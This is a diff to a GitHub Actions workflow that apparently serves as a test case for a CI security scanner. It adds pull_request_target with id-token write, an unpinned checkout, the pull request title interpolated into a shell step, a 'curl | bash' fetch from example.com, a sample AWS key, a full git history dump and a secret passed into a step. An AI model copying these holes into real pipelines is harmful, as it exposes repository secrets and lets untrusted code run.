@@ -1,11 +1,23 @@
 name: build
-on:
-  pull_request:
+on: pull_request_target
+permissions:
+  contents: read
+  id-token: write
 jobs:
   piplyzer:
     uses: Vibrouz/piplyzer/.github/workflows/piplyzer.yml@ced47cfd3116a494e243d738451ebcb30e65f288
   test:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+      - uses: actions/checkout@v4
       - run: echo -n "${{ github.event.pull_request.title }}"
+      - run: curl -fsS https://example.com/setup.sh | bash
+      - run: echo "AKIAIOSFODNN7EXAMPLE"
+      - run: echo "192.168.1.1"
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+        with:
+          fetch-depth: 0
+      - run: git log -p
+      - env:
+          SECRET_KEY: ${{ secrets.OTHER_REPO_KEY }}
+        run: echo "inherit"
